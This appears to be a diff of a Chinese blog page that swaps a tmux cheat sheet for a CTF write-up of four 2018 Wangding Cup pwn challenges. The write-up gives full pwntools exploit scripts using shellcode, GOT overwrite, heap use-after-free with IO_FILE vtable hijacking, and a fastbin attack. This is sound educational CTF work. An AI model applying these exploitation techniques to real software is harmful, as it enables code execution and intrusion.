@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>tmux | 风云阁</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="tmux | 风云阁">
+  <title>2018网鼎杯Pwn | 风云阁</title>
+  <meta name="keywords" content=" Pwn , CTF ">
+  <meta name="description" content="2018网鼎杯Pwn | 风云阁">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="@[toc] Fuzzing 炼金路Lazy Pwner ☞ primelee  声明：以下仅作为笔记学习，不是作者原创。  开箱即用的佩剑 —— AFL make .  写栈溢出源码 gets(name)   插桩编译   创建初识语料库 echo &#39;Pwn me&#39; &gt;&gt; .&#x2F;input&#x2F;a.in Go fuzzing ! Oh no …   Fix it… sudo">
 <meta property="og:type" content="article">
@@ -353,19 +353,33 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-tmux" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-2018网鼎杯Pwn" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">tmux</h1>
+        <h1 class="article-title">2018网鼎杯Pwn</h1>
     
     <div class="article-meta">
         
         
         
+        <span class="book">
+            
+                <a  data-rel="CTF">CTF</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color4">Pwn</a>
+            
+            <a class="color4">CTF</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-16 02:06:12'>2019-07-18 00:00</time>
+        创建时间:<time class="date" title='更新时间: 2020-04-15 11:49:46'>2020-04-15 00:00</time>
         
     </div>
     <div class="article-meta">
@@ -387,7 +401,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Session-Management"><span class="toc-text">Session Management</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows"><span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Panes"><span class="toc-text">Panes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Helpful-tmux-commands"><span class="toc-text">Helpful tmux commands</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2018网鼎杯-Pwn"><span class="toc-text">2018网鼎杯 Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#note"><span class="toc-text">note</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#note2"><span class="toc-text">note2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#soEasy"><span class="toc-text">soEasy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pesp"><span class="toc-text">pesp</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -403,58 +417,243 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>All from <a href="https://thoughtbot.com/blog/a-tmux-crash-course" target="_blank" rel="noopener">https://thoughtbot.com/blog/a-tmux-crash-course</a></p>
-<h1 id="Session-Management"><a href="#Session-Management" class="headerlink" title="Session Management"></a>Session Management</h1><p>Sessions are useful for completely separating work environments. I have a ‘Work’ session and a ‘Play’ session; in ‘Work’, I keep everything open that I need during my day-to-day development, while in ‘Play’, I keep open current open-source gems or other work I hack on at home.</p>
-<pre><code>tmux new -s session_name</code></pre><p>creates a new tmux session named session_name</p>
-<pre><code>tmux attach -t session_name</code></pre><p>attaches to an existing tmux session named session_name</p>
-<pre><code>tmux switch -t session_name</code></pre><p>switches to an existing session named session_name</p>
-<pre><code>tmux list-sessions</code></pre><p>lists existing tmux sessions</p>
-<pre><code>tmux detach (prefix + d)</code></pre><p>detach the currently attached session</p>
-<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><a href="https://thoughtbot.com/blog/a-tmux-crash-course#windows" target="_blank" rel="noopener">Windows</a></h2><p>tmux has a tabbed interface, but it calls its tabs “Windows”. To stay organized, I rename all the windows I use; if I’m hacking on a gem, I’ll name the window that gem’s name. The same thing goes for client applications. That way, I can recognize windows by context and not what application it’s running.</p>
-<ul>
-<li><p><code>tmux new-window (prefix + c)</code></p>
-<p>create a new window</p>
-</li>
-<li><p><code>tmux select-window -t :0-9 (prefix + 0-9)</code></p>
-<p>move to the window based on index</p>
-</li>
-<li><p><code>tmux rename-window (prefix + ,)</code></p>
-<p>rename the current window</p>
-</li>
-</ul>
-<h2 id="Panes"><a href="#Panes" class="headerlink" title="Panes"></a>Panes</h2><p>Panes take my development time from bland to awesome. They’re the reason I was able to uninstall MacVim and develop solely in iTerm2. I don’t have to switch applications to switch contexts (editing, reading logs, IRB, etc.) - everything I do, I do in a terminal now. People argue that OS X’s Cmd+Tab is just as fast, but I don’t think so.</p>
-<ul>
-<li><p><code>tmux split-window (prefix + &quot;)</code></p>
-<p>splits the window into two vertical panes</p>
-</li>
-<li><p><code>tmux split-window -h (prefix + %)</code></p>
-<p>splits the window into two horizontal panes</p>
-</li>
-<li><p><code>tmux swap-pane -[UDLR] (prefix + { or })</code></p>
-<p>swaps pane with another in the specified direction</p>
-</li>
-<li><p><code>tmux select-pane -[UDLR]</code></p>
-<p>selects the next pane in the specified direction</p>
-</li>
-<li><p><code>tmux select-pane -t :.+</code></p>
-<p>selects the next pane in numerical order</p>
-</li>
-</ul>
-<h2 id="Helpful-tmux-commands"><a href="#Helpful-tmux-commands" class="headerlink" title="Helpful tmux commands"></a>Helpful tmux commands</h2><ul>
-<li><p><code>tmux list-keys</code></p>
-<p>lists out every bound key and the tmux command it runs</p>
-</li>
-<li><p><code>tmux list-commands</code></p>
-<p>lists out every tmux command and its arguments</p>
-</li>
-<li><p><code>tmux info</code></p>
-<p>lists out every session, window, pane, its pid, etc.</p>
-</li>
-<li><p><code>tmux source-file ~/.tmux.conf</code></p>
-<p>reloads the current tmux configuration (based on a default tmux config)</p>
-</li>
-</ul>
+        <h1 id="2018网鼎杯-Pwn"><a href="#2018网鼎杯-Pwn" class="headerlink" title="2018网鼎杯 Pwn"></a>2018网鼎杯 Pwn</h1><p><div class='inner-toc'><h2>目录</h2><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2018网鼎杯-Pwn"><span class="toc-text">2018网鼎杯 Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#note"><span class="toc-text">note</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#note2"><span class="toc-text">note2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#soEasy"><span class="toc-text">soEasy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pesp"><span class="toc-text">pesp</span></a></li></ol></li></ol></li></ol></div></p>
+<p>今年网鼎杯5月10日开赛。第一届在前年举办，参赛队伍众多，堪称网络安全”奥运会“。谷歌了一圈，第三场的 Pwn Writeup 不齐全。第三场有4道题目。有两道题目比较有趣，写一篇博文记录心得。 </p>
+<h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>下标溢出+改puts_got+写shellcode。</p>
+<pre><code class="python">from pwn import  * 
+import primedbg
+context.log_level=&#39;debug&#39;
+io=process(&#39;./deathnote&#39;)
+if len(sys.argv)&gt;1 and sys.argv[1]==&#39;dbg&#39;:
+    primedbg.p_attach_dbg(io,[0x00011E9])
+def cmd(idx):
+    global io; io.sendlineafter(&#39;hoice&gt;&gt;&#39;,str(idx))
 
+def add(idx,sz,c):
+    global io; cmd(1)
+    io.sendlineafter(&#39;Page:&#39;,str(idx))
+    io.sendlineafter(&#39;Size:&#39;,str(sz))
+    io.recvuntil(&#39;Name:&#39;)
+    io.send(c)
+
+def show(idx):
+    global io; cmd(3)
+    io.sendlineafter(&#39;Page:&#39;,str(idx)   )
+
+def free(idx):
+    global io; cmd(2)
+    io.sendlineafter(&#39;Page:&#39;,str(idx))
+
+io.sendlineafter(&#39; me your name:&#39;,&#39;/bin/sh\x00&#39;)
+sc1=asm(&#39;xor eax, eax&#39;) + &#39;\xeb\x1c&#39; # jmp 0x20
+sc2=asm(&#39;mov al, 0x3b&#39;) + &#39;\xeb\x1c&#39; # jmp 0x20
+sc3=asm(&#39;syscall;ret&#39;) + &#39;\x00&#39; 
+sc4=asm(&#39;xor edx, edx&#39;)+&#39;\xeb\x9c&#39; # jmp -0x60 (jmp back to sc1)
+
+add(0,4,sc1)
+add(0,4,sc2)
+add(0,4,sc3)
+add(0x100000000-25,4,sc4) #puts_got
+#primedbg.p_attach_dbg(p,[0x0001238],{&#39;page&#39;:0x2020E0})
+show(0x100000000 - 4)
+
+
+io.interactive()
+</code></pre>
+<h3 id="note2"><a href="#note2" class="headerlink" title="note2"></a>note2</h3><p><strong>分析程序</strong></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415105527230.png" alt="保护机制"></p>
+<p>保护选项全部开启。 </p>
+<p>RELRO等级为FULL，GOT表劫持不可行。 FORTIFY 开启，格式化字符串优化了。</p>
+<p>PIE 开启，ELF在内存中的地址随机了。 </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415110504350.png" alt="运行程序"></p>
+<p>题目输出内容和第一题 deathnote 差不多。 Write Delete Exit 三个功能。 </p>
+<p>IDA 静态分析一番后，我发现作者在堆管理相比于第一版的管理机制增加了一些特点，安全性提高。但毕竟低级的 堆管理还是很脆弱的。 以前分析过 glibc 的堆管理源码的人都晓得，代码量巨多、堆块检查多样、数据结构设计的精巧。 这道题目堆管理的机制确实比glibc的低级很多。 好了，不说这么多口水话了，逆向分析审计逻辑。</p>
+<p>low_malloc_func 分析。 </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415111251913.png" alt="low_malloc_func-1"></p>
+<p> 内存块小于0x70字节的申请从 xmmword_202120 链表中获得。这个链表是一个低级版本的fastbin。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415111522133.png" alt="low_malloc_func-2"></p>
+<p>申请空间大于0x70的从另一个空闲bin中获得，这里模拟了glibc unsortedbin，我随手命名成 largebin 了。这里的bin是单链表，遇到足够大的内存块就取下来。 注意最后一行，szie 字段最低位没有置1以示占用。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415112027183.png" alt="low_malloc_func-3"></p>
+<p>两个bin都没有则从 topchunk 中获得。</p>
+<p>接下来分析 low_free_func。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415112214299.png" alt="low_free_func-1"></p>
+<p>小块放入fastbin</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415112255131.png" alt="low_free_func-2"></p>
+<p>相邻下一个chunk正好是top时，当前chunk和top合并。末位清零。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415112413083.png" alt="low_free_func-3"></p>
+<p>相邻下一个chunk不为top且占用时，直接放入largebin</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415112500837.png" alt="image-20200415112500837"></p>
+<p>相邻下一个chunk不为top且为占用，合并。</p>
+<p><strong>漏洞分析</strong></p>
+<p>方才说到 low_malloc 函数有一处分配的 chunk 没有标记占用，此为漏洞点一。 漏洞点二在于 low_free 函数合并相邻下一个chunk时未 unlink 对应的 chunk。这里我利用漏洞点二进行攻击</p>
+<p><strong>攻击思路</strong></p>
+<ul>
+<li><input disabled type="checkbox"> 漏洞点二造成UAF、篡改 fd 字段。</li>
+<li><input disabled type="checkbox"> 由于堆管理机制低级，未做有效检查，实现任意地址分配。</li>
+<li><input disabled type="checkbox"> 任意地址读写。</li>
+</ul>
+<p>程序开了PIE，堆管理的内存块没有指向 ELF 的符号或 libc 的符号。这里有一点需要注意。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/A36095D72B8EB2F5E57AADAAB011A196.jpg" alt="vmmap"></p>
+<p>mmap 返回的内存地址与 libc.so 的基地址是一个固定值。</p>
+<p>这样通过泄露 chunk 的 fd，来确定基地址。这样一来就确定了 one_gadgets 和 _IO_2_1_stdout 。</p>
+<p>GOT表劫持行不通，没有hook可写。IO_FILE 有一处 vtable 函数表，可以篡改。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415113625535.png" alt="rw-p 页可写"></p>
+<p><strong>分析 puts 函数</strong> </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415113806831.png" alt="ioputs.c"></p>
+<p>根据逻辑短路，直接跳进 _IO_sputn() 。 （推荐用 vs code 查看源码。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415113930530.png" alt></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415113949168.png" alt></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415114013078.png" alt></p>
+<p>好了，没有任何检查，直接行动！</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415114044935.png" alt="_IO_jump_t"></p>
+<p>__xsputn 偏移8个指针。伪造就完事了。</p>
+<p><strong>Pwned!</strong></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/image-20200415114244732.png" alt></p>
+<p><strong>exp</strong></p>
+<pre><code class="python">from pwn import * 
+from primedbg import * 
+import sys
+p=process(&#39;./deathnote2_new&#39;)
+context.arch=&#39;amd64&#39;
+
+fastbin=0x00202120
+largebin=0x000202168
+
+def cmd(i):
+    global p; p.sendlineafter(&#39;choice&gt;&gt;&#39;,str(i))
+
+def add(sz,c):
+    global p; cmd(1)
+    p.sendlineafter(&#39;Size:&#39;,str(sz))
+    p.sendafter(&quot;Name:&quot;,c)
+
+def free(i):
+    global p; cmd(2)
+    p.sendlineafter(&#39;Page:&#39;,str(i))
+
+def show(i):
+    global p; cmd(3)
+    p.sendlineafter(&#39;Page:&#39;,str(i))
+# brk points #show 0x001190 ; #add ret 0x0E7B
+if len(sys.argv)&gt;1:
+    attach_dbg_pie(p,[0x0001190 ],{&#39;list&#39;:0x0202060,&#39;fastbin&#39;:fastbin,&#39;largebin&#39;:largebin})
+
+
+#pause()
+p.sendline(&#39;/bin/sh&#39;)
+add(0x20,&#39;#0\n&#39;)
+add(0x80,&#39;#1\n&#39;)
+add(0x20,&#39;#2\n&#39;)
+add(0x20,&#39;#3\n&#39;)
+add(0x20,&#39;#4\n&#39;)
+
+free(3)
+free(2)
+free(1)
+#show(0)
+add(0x98,&#39;a&#39;*0x90+&#39;a&#39;*8) #1
+show(1)
+p.recvuntil(&#39;a&#39;*0x98)
+heap=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+heap&gt;&gt;=12; heap&lt;&lt;=12
+print(&#39;heap&#39;,hex(heap))
+libc=heap-6201344
+print(hex(libc))
+stdout_vtable=3954424+libc-0x10
+
+vtable=flat([
+    0,0,0,0,0,0,0,
+    0x4526a+libc
+])
+add(0x100,vtable+&#39;\n&#39;) #2
+fvtable=heap+0x1b0
+
+free(1)
+add(0xc0,&#39;a&#39;*0x90+p64(0x40)+p64(stdout_vtable)+&#39;\n&#39;) #1
+add(0x20,&#39;#3\n&#39;) #3
+show(0) # 2nd
+add(0x20,p64(fvtable)+&#39;\n&#39;) #4
+# show(0)
+
+
+p.interactive()</code></pre>
+<h3 id="soEasy"><a href="#soEasy" class="headerlink" title="soEasy"></a>soEasy</h3><p>真的easy</p>
+<pre><code class="python">from pwn import * 
+from primedbg import *
+#context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+io=process(&#39;./pwn&#39;)
+io.recvuntil(&#39;-&gt;&#39;)
+buf_addr=int(io.recv(10),16)
+print(hex(buf_addr))
+sc = &#39;&#39;
+sc += &#39;push 0x68732f\n&#39;
+sc += &#39;push 0x6e69622f\n&#39;
+sc +=  &#39;mov ebx, esp\n&#39;
+sc += &#39;xor ecx, ecx\n&#39;
+sc += &#39;xor edx, edx\n&#39;
+sc += &#39;push 0xb\n&#39;
+sc += &#39;pop eax\n&#39;
+sc += &#39;int 0x80\n&#39;
+sc=asm(sc)
+sc=sc+(0x4c-len(sc))*chr(0x90)+p32(buf_addr)+&#39;\n&#39;   
+print(len(sc))
+io.send(sc)
+io.interactive()</code></pre>
+<h3 id="pesp"><a href="#pesp" class="headerlink" title="pesp"></a>pesp</h3><p>fastbin attack 堆溢出 改写 item_list 指针实现任意地址读写。</p>
+<pre><code>from pwn import * 
+import primedbg
+import sys
+p=process(&#39;./pwn_new&#39;)
+context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+team=0x0006020C8
+item=0x06020C0 
+
+def cmd(i):
+    global p; p.sendlineafter(&#39;Your choice:&#39;,str(i))
+
+def add(sz,c):
+    global p; cmd(2)
+    p.sendlineafter(&#39;f servant name:&#39;,str(sz))
+    p.sendafter(&#39;ame of servant:&#39;,c)
+
+def edit(i,sz,c):
+    global p; cmd(3)
+    p.sendlineafter(&#39;servant:&#39;,str(i))
+    p.sendlineafter(&#39; servant name:&#39;,str(sz))
+    p.sendlineafter(&#39;ew name of the servnat:&#39;,str(c))
+
+def show():
+    cmd(1)
+
+def free(i):
+    global p; cmd(4)
+    p.sendlineafter(&#39;servant:&#39;,str(i))
+
+add(0x28,&#39;#0\n&#39;)
+add(0x28,&#39;#1\n&#39;) #1
+add(0x28,&#39;#2\n&#39;) #2
+add(0x31,&#39;top\n&#39;) #3
+free(1)
+edit(0,0x100,&#39;a&#39;*0x28+p64(0x31)+p64(item+16*3-8)+&#39;\n&#39;)
+edit(0,0x28,&#39;/bin/sh\x00&#39;) #0
+add(0x28,&#39;#1\n&#39;)
+
+
+add(0x28,p64(0x602018)+p64(0x31)+p64(0x0602068)) #4 key #3
+show()
+if len(sys.argv)&gt;1:
+    primedbg.attach_dbg(p,[0x0400C4B ],{&#39;team&#39;:team})
+p.recvuntil(&#39;3 : &#39;)
+
+m=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+puts_off=m-p.libc.address
+libcbase=m-0x844f0
+print(&#39;base&#39;,hex(libcbase))
+pause()
+edit(4,0x8,p64(libcbase+0xf1147))
+cmd(4)
+p.interactive()
+</code></pre>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论。 </span>
     </div>
@@ -463,12 +662,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>tmux</p>
+    <p><span class="copy-title">文章标题:</span>2018网鼎杯Pwn</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-07-18, 00:00:00</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-16, 02:06:12</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/07/18/tmux/" title="tmux">https://primelyw.github.io/2019/07/18/tmux/</a>
+    <p><span class="copy-title">发布时间:</span>2020-04-15, 00:00:00</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-15, 11:49:46</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/" title="2018网鼎杯Pwn">https://primelyw.github.io/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AFPwn/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
